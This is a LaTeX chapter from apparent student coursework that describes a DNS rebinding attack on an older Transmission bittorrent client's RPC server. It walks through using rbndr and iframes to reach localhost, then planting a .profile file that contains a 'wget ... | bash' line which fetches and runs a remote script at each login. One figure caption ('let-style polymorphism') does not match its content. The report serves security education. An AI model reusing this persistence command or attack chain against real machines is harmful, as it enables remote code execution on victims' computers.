\chapter{Implementation of Attack Using DNS Rebinding}
\label{implementation}

In this coursework we attack the Transmission (\texttt{< v2.9.3}) bittorrent
client. We use DNS Rebinding to exploit a (now patched \cite{transmission_pr})
vulnerability discovered by Tavis Ormandy.

The vulnerability allows us to send arbitrary commands to Transmission's remote
procedure call (RPC) server which it uses to enable the web interface to manage
torrent downloads and application settings. DNS Rebinding is essential to this
attack due to the Same-Origin Policy, the local RPC server would in general
drop requests responding with \texttt{403: Access Forbidden} as the IP is not
allowed to. Through DNS Rebinding request can be made to look as though they
originate from any IP address, in our case we choose \texttt{127.0.0.1} (the
IPv4 loopback interface).

Our implementation\footnote{Our project is available at:
\url{https://github.com/CGA1123/F20AN}} makes us of \texttt{rbndr} \cite{rbndr}
a DNS rebinding service created explicitly for testing of DNS rebinding
vulnerabilities by Tavis Ormandy. It implements time-varying DNS rebinding,
that is the DNS server will alternate responses between two given IP addresses.
Figure \ref{rbndr_host} shows an example of this.

\begin{figure}[H]
\begin{center}
\begin{tabular}{c}
\begin{lstlisting}
$ host 7f000001.7f000002.rbndr.us
7f000001.7f000002.rbndr.us has address 127.0.0.1
$ host 7f000001.7f000002.rbndr.us
7f000001.7f000002.rbndr.us has address 127.0.0.2
\end{lstlisting}
\end{tabular}
\end{center}
\caption{Example of let-style polymorphism}
\label{rbndr_host}
\end{figure}

Our implementation builds on the proof of concept attack presented by Tavis
Ormandy in his security report to the Transmission security team
\cite{tavis_report}.

We server specially crafted JavaScript from an attack server that repeatedly
loads an iFrame with the following url
\url{7f000001.0a00021e.rbndr.us:9091/transmission/iframe.html} when the DNS
rebinding service binds to our attack server (\texttt{0a00021e} is
\texttt{10.0.2.30} converted to base 16) it loads another script that will
first of all stop the initial web page from reloading the iframe, and then make
\texttt{XMLHttpRequests} to \url{/transmission/rpc} until the DNS server binds
\url{7f000001.0a00021e.rbndr.us:9091} to \texttt{127.0.0.1} at which point the
we can send arbitrary requests to the Transmission RPC server running on the
victims machine.

The RPC server is very well documented (See \cite{rpc_spec}), in our attacks we
send a \texttt{torrent-add} command to download a \texttt{.profile} file to the
victims home directory. The home directory is found by analysing the user's
current download directory which is found through the \texttt{session-get} RPC
command.

After a successful attack the victim will have a \texttt{.profile} downloaded
to their home directory which contains the following code: \texttt{wget -q -O -
http://10.0.2.30/attack.sh | bash} which allows an attacker to host a attack
script which will be executed whenever the user starts a login shell, or logs
in graphically. For demonstration purposes our attack script does not do
anything malicious and is shown in Figure \ref{attack_script}, however any
arbitrary code could be executed.

\begin{figure}[H]
\begin{center}
\begin{tabular}{c}
\begin{lstlisting}
while true; do
	notify-send -i face-wink "Attack Successful!"
	sleep 5
done &
\end{lstlisting}
\end{tabular}
\end{center}
\caption{Our example attack script}
\label{attack_script}
\end{figure}
